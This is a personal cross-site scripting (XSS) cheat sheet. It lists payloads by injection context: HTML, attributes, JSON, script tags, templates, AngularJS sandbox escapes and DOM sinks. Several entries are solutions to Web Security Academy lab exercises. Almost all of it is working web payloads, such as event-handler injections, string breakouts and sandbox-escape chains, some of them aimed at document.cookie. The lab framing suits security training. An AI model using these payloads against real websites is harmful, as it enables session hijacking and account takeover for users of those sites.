### in HTML ###
<script>alert('fuckh1')</script>
<img src=1 onerror=alert('fuckh1')>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>





## SVG Allowed
<svg><animatetransform onbegin=alert(1) attributeName=transform>
'"><img src=x onerror=alert(1) />

## Custom Tag Allowed
# Detect
<xss autofocus tabindex=1 onfocus=alert(1)></xss>
# Weaponize
<script>
location = 'https://0a88003804cd6e2e83d82d30008a0038.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>


### in ATTR ###
"><svg onload=alert('fuckh1')>
javascript:alert('fuckh1')
" onclick=alert('fuckh1') a="
" onmouseover="alert('fuckh1')
http://foo?&apos;-alert(1)-&apos;
href
	javascript:alert()

## Char Blocked
# Detect
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">
# Solution
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
	
	

### in JSON ###
\"-alert()}//
'-alert(1)-'
\'-alert();//

### in SCRIPT TAG ###
</script><script>alert()</script>

### in TAG ###
</select><img src=x onerror=alert()>

### in TEMPLATE ###
${alert(1)}


### AngularJs ###
## Basic
# Detect
<body ng-app>
# Solution
{{$on.constructor('alert(1)')()}}

## Sandbox Escape
# Detect
	angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
		$scope.query = {};
		var key = 'search';
		$scope.query[key] = 'fuckh1';
		$scope.value = $parse(key)($scope.query);
	});
# Solution
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

## Sandbox Escape 2

# Solution
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

	
############# WAF ############


############# DOM XSS ############
### Document.write
# Detect
	document.write('<option selected>'+store+'</option>');
# Solution
	&storeId=<img src%3d1 onerror%3dalert()>

	
### Event: Hashchange
# Detect
    $(window).on('hashchange', function(){
		var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
		if (post) post.get(0).scrollIntoView();
	});
# Solution
	<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
































